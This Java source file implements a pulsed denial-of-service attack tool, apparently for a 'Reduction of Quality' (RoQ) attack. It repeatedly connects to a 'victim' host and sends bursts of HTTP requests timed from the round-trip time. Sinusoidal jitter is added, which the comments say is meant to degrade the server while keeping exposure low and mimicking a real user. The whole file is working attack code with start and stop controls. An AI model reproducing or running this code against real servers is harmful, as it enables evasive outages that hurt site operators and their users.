package hardroq.networking;

import hardroq.controllers.AttackController;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Date;
import java.util.Random;
import java.util.logging.Logger;

public class TCPRoQ {
	//Tools
	private static final Random random = new Random();
	private static final AttackController ac= AttackController.getInstance();
	private Thread workerThread;
	private Thread monitorThread;
	private Socket socket;
	
	//Parameters
	private final String host;
	private final int port;
	private final String header;
	private final String footer;
	private final String payload;
	private final float bandwidth;
	private int period;				// T
	private int amplitude;			// δ
	private int duration;			// t
	private int timeout;			// T - t
	private float aggression;		// M
	private long packCount = 0;
	private long startWriteTime = -1;

	//Internals
	volatile private static int RTT;
	private boolean attacking = false;
	
	private TCPRoQ (final Builder builder) {
		host = builder.host;
		port = builder.port;
		RTT = builder.RTT;
		header = builder.header;
		footer = builder.footer;
		aggression = builder.aggression;
		bandwidth = builder.bandwidth;  //this should be in kb/ms, which just happens to be the same as mb/s :)
		
		//for now, let's just const the payload
		payload = (header + footer + "\r\n\r\n");
		workerThread = new Thread();
		monitorThread = new Thread();
	}
	
	public void InitiateAttack() {
		attacking = true;
		if (!workerThread.isAlive()) {
			workerThread = new Thread(work, "Attack Thread");
			workerThread.start();
		}
		
		if (!monitorThread.isAlive()) {
			monitorThread = new Thread(socketWriteMonitor, "Write Monitor Thread");
			monitorThread.start();
		}
	}
	
	public void EndAttack() {
		attacking = false;
	}
	
	private Runnable socketWriteMonitor = new Runnable() {
		@Override
		public void run() {
			//we don't want our socket to just sit there blocked on the write, so let's just drop it and start a new socket
			while (attacking) {
				try {
					final int timepassed = (int) (System.currentTimeMillis() - startWriteTime);
					if (startWriteTime != -1 &&  timepassed > 3000) {
						socket.close();
						startWriteTime = -1;
					}
				} catch (IOException e) {
					System.out.println(e.getMessage());
				}
			}
		}
		
	};
	
	private Runnable work = new Runnable() {
		@Override
		public void run() {
			while (attacking) {
				try {
					//Establish a connection to our victim
					socket = new Socket(host, port);
					socket.setSoTimeout(3000);
				
					/*
					  Connection established, now the idea is to repeatedly send requests at an amplitude (rate)
					  such that: amplitude = ((aggression * bandwidth) * duration) / datasize per second.
					  
					  duration will vary from between RTT ~ 2RTT in attempt to trash the server, while keeping exposure low
					  
					  period will vary sinusoidally between 8 ~ 20 RTT with a jitter of ±2 in order to simulate a real user 
					*/
					int c = random.nextInt(12);					
					OutputStream out = socket.getOutputStream();
					while (socket.isConnected() && attacking) {
						//calculate the period for this attack round (in ms).
						period = (RTT * ((8 + (int) Math.ceil(Math.sin(c / 12f) * 12)) + (2 - random.nextInt(4))));
						
						if (++c > 12) c = 0;
						
						//calculate the duration for this attack round (in ms).
						duration = (int) Math.ceil(RTT * (1 + random.nextFloat()));
						
						//calulate the amplitude for this attack
						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.getBytes().length * .008f));
						
						//calculate the timeout
						timeout = period - duration;
						
						//grab the time before the attack
						long startTime = System.currentTimeMillis();
						
						for (int i = amplitude; --i > 0;) {
							final String attackPacket = payload.replace("_targeturl_", getResource());
							
							//clear the input buffer
							socket.getInputStream().skip(socket.getInputStream().available());
							
							//send the data
							startWriteTime = System.currentTimeMillis();
							out.write(attackPacket.getBytes());
							out.flush();
							//and just to be sure..
							out.flush();
							
							//reset the write time
							startWriteTime = -1;
							
							System.out.println(String.valueOf(++packCount) + ": Packet sent");
						}
						
						//sleep for the timeout
						timeout = (int) (timeout - (System.currentTimeMillis() - startTime));
						if (timeout < 0) timeout = 1;
						Thread.sleep(timeout);
					}
				} catch (Exception ex) {
					System.out.println(ex.getMessage());
				}
			}
		}

        private String getResource() {
            return ac.getRandomResource();
        }
	};
	
	public static void setRTT(final int r) {
		RTT = r;
	}
	
	public long getPacketsSent() {
		return packCount;
	}
	
	public static class Builder {
		public Builder() {}
		private String host = "127.0.0.1";
		private int port = 80;
		private int RTT = 150;
		private String header = "";
		private String footer = "";
		private float aggression = 1.0f;
		private float bandwidth = 1;  //1MB line
		
		public TCPRoQ build() {
			return new TCPRoQ(this);
		}
		
		public Builder host(final String h) {
			host = h;
			return this;
		}
		
		public Builder port (final int p) {
			port = p;
			return this;
		}
		
		public Builder RTT (final int t) {
			RTT = t;
			return this;
		}

		public Builder header(final String h) {
			header = h;
			return this;
		}
		
		public Builder footer(final String f) {
			footer = f;
			return this;
		}
		
		public Builder aggression(final float a) {
			aggression = a;
			return this;
		}
		
		public Builder bandwidth(final float b) {
			bandwidth = b;
			return this;
		}
	}
}
